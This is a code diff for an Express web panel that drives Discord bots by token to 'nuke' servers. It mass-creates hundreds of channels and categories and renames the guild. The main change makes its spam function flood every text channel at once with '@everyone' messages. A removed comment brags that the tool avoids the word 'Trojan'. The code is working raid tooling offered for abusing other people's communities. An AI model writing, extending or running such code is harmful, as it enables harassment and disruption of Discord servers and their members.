@@ -1,6 +1,5 @@
 // server.js - GRoup5br ULTIMATE SUITE 2099
-// التحكم الكامل بالأسماء + مبدل الواجهة + فاحص الملفات والروابط
-// بدون أي إشارة لكلمة Trojan
+// التعديل الوحيد: دالة السبام تشتغل على جميع الرومات دفعة واحدة
 
 const express = require('express');
 const session = require('express-session');
@@ -29,7 +28,6 @@ app.use(session({
     cookie: { maxAge: 3600000 }
 }));
 
-// ========== إعدادات المستخدم لكل جلسة ==========
 const userSettings = new Map();
 
 function getUserSettings(sessionId) {
@@ -183,7 +181,7 @@ function createStopFlag(operationId) {
     return flag;
 }
 
-// ========== Parallel Nuke مع أسماء مخصصة ==========
+// ========== Parallel Nuke ==========
 async function parallelNuke(client, guild, username, operationId, settings) {
     const stopFlag = activeOperations.get(operationId);
     if (!stopFlag) return { error: 'تم إلغاء العملية' };
@@ -202,7 +200,6 @@ async function parallelNuke(client, guild, username, operationId, settings) {
     
     if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
     
-    // إنشاء رومات نصية بالاسم المخصص
     const textPromises = [];
     for (let i = 0; i < 200; i++) {
         if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
@@ -219,7 +216,6 @@ async function parallelNuke(client, guild, username, operationId, settings) {
     
     if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
     
-    // رومات صوتية
     const voicePromises = [];
     for (let i = 0; i < 100; i++) {
         if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
@@ -236,10 +232,9 @@ async function parallelNuke(client, guild, username, operationId, settings) {
     
     if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
     
-    // فئات
     const categoryPromises = [];
     for (let i = 0; i < 100; i++) {
-        if (stopFlag.shouldStop) return { error: 'تم إيقاع العملية', stopped: true };
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
         categoryPromises.push(
             guild.channels.create({
                 name: `${settings.nukeCategoryPrefix}-${i+1}`,
@@ -253,7 +248,6 @@ async function parallelNuke(client, guild, username, operationId, settings) {
     
     if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
     
-    // تغيير اسم السيرفر
     await guild.setName(`${settings.nukeServerName}-BY-${username.slice(0,8)}`).catch(() => null);
     
     results.totalCreated = results.createdTextChannels + results.createdVoiceChannels + results.createdCategories;
@@ -263,7 +257,6 @@ async function parallelNuke(client, guild, username, operationId, settings) {
     return results;
 }
 
-// ========== باقي الدوال بنفس القوة ==========
 async function parallelMassChannels(client, guild, count, prefix, username, operationId, settings) {
     const stopFlag = activeOperations.get(operationId);
     if (!stopFlag) return { error: 'تم إلغاء العملية' };
@@ -379,25 +372,52 @@ async function parallelSlowmodeAll(guild, seconds, operationId) {
     return { success: true, slowed: results.filter(r => r !== null).length };
 }
 
+// ========== 🔥 التعديل الوحيد هنا - سبام على جميع الرومات دفعة واحدة 🔥 ==========
 async function parallelTextSpam(guild, count, message, operationId) {
     const stopFlag = activeOperations.get(operationId);
     if (!stopFlag) return { error: 'تم إلغاء العملية' };
     
-    const channel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
-    if (!channel) return { error: 'لا توجد قناة نصية' };
+    // جلب جميع القنوات النصية في السيرفر
+    const allChannels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
     
-    const spamPromises = [];
-    for (let i = 0; i < count; i++) {
+    if (allChannels.size === 0) return { error: 'لا توجد قنوات نصية' };
+    
+    let totalSent = 0;
+    const channelArray = [...allChannels.values()];
+    
+    // لكل قناة، نرسل العدد المطلوب من الرسائل دفعة واحدة لكل قناة
+    const channelPromises = [];
+    
+    for (const channel of channelArray) {
         if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
-        spamPromises.push(channel.send(message || '@everyone 🔥 GRoup5br 2099 🔥').catch(() => null));
-        if (spamPromises.length >= 20) {
-            await Promise.all(spamPromises);
-            spamPromises.length = 0;
+        
+        // إنشاء بروميس لإرسال العدد المطلوب من الرسائل في هذي القناة دفعة واحدة
+        const spamPromises = [];
+        for (let i = 0; i < count; i++) {
+            if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+            spamPromises.push(channel.send(message || '@everyone 🔥 GRoup5br 2099 🔥').catch(() => null));
         }
+        
+        // نضيف بروميس إرسال كل الرسائل في هذي القناة دفعة واحدة
+        channelPromises.push(
+            Promise.all(spamPromises).then(results => {
+                totalSent += results.filter(r => r !== null).length;
+            })
+        );
     }
-    if (spamPromises.length > 0) await Promise.all(spamPromises);
-    return { success: true, sent: count };
+    
+    // انتظار انتهاء جميع القنوات من الإرسال (كل قناة ترسل count رسالة دفعة واحدة)
+    await Promise.all(channelPromises);
+    
+    return { 
+        success: true, 
+        sent: totalSent,
+        channelsUsed: channelArray.length,
+        messagesPerChannel: count,
+        message: `✅ تم إرسال ${totalSent} رسالة (${count} رسالة في كل من ${channelArray.length} قناة)`
+    };
 }
+// ========== نهاية التعديل ==========
 
 // ========== دالة التنفيذ الرئيسية ==========
 async function executeCommand(botToken, serverId, command, params = {}) {
@@ -598,7 +618,6 @@ app.post('/api/logout', (req, res) => {
     res.json({ success: true });
 });
 
-// ========== Routes الفاحص ==========
 app.post('/api/analyze-file', upload.single('file'), async (req, res) => {
     if (!req.file) return res.json({ error: 'لا يوجد ملف' });
     const result = await analyzeFile(req.file.path, req.file.originalname);
@@ -620,13 +639,16 @@ app.post('/api/analyze-link', (req, res) => {
     res.json(result);
 });
 
-app.listen(PORT, () => {
+const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`
     ╔══════════════════════════════════════════════╗
     ║   GRoup5br ULTIMATE SUITE 2099               ║
     ║   http://localhost:${PORT}                      ║
-    ║   بدون أي إشارة لكلمة Trojan                ║
-    ║   التحكم الكامل بأسماء النيوك + Scanner      ║
+    ║   التعديل: السبام يشتغل على جميع الرومات دفعة واحدة ║
     ╚══════════════════════════════════════════════╝
     `);
 });
+
+server.timeout = 300000;
+server.keepAliveTimeout = 300000;
+server.headersTimeout = 300000;
